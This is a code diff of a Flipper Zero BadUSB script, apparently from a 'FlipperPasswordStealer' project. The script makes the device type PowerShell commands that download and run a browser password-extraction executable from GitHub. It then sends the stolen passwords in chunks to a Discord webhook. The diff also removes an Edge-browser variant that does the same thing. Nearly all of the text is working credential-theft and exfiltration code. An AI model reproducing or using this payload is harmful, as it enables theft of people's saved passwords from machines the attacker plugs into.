@@ -6,39 +6,16 @@ let script=[
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe';",
    "$exePath = '.\\chrome.exe';",
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
-   "$commandOutput = & $exePath;",
+   "$commandOutput = & $exePath | Out-String;",
    "$chunks = [Math]::Ceiling($commandOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $commandOutput.Length - $start);$content = $commandOutput.Substring($start, $length);$discordData = @{'username' = 'Flipper';'content' = $content;};$jsonData = ConvertTo-Json -InputObject $discordData;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';}"
 ];
 
-
-
 badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl" });
-
-submenu.addItem("Edg3 Browser", 1);
-submenu.addItem("Chrome", 0);
-submenu.addItem("Exit",2);
-submenu.setHeader("Select browser:");
-
-let result = submenu.show();
-if(result===2){badusb.quit();}
-if(result===1){
-    script=[
-        "$webhookUrl = '<webhook>';",
-        "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/edge.exe';",
-        "$exePath = '.\\edge.exe';",
-        "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
-        "$commandOutput = & $exePath;",
-        "$commandOutput = & '.\\edge.exe' | Out-String;",
-        "$chunks = [Math]::Ceiling($commandOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $commandOutput.Length - $start);$content = $commandOutput.Substring($start, $length);$discordData = @{'username' = 'Flipper';'content' = $content;};$jsonData = ConvertTo-Json -InputObject $discordData;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';}"
-    ]
-}
 
 let command = "";
 for (let i = 0; i < script.length; i++) {
     command += script[i];
 }
-
-
 
 print("Waiting for connection");
 while (!badusb.isConnected()) {
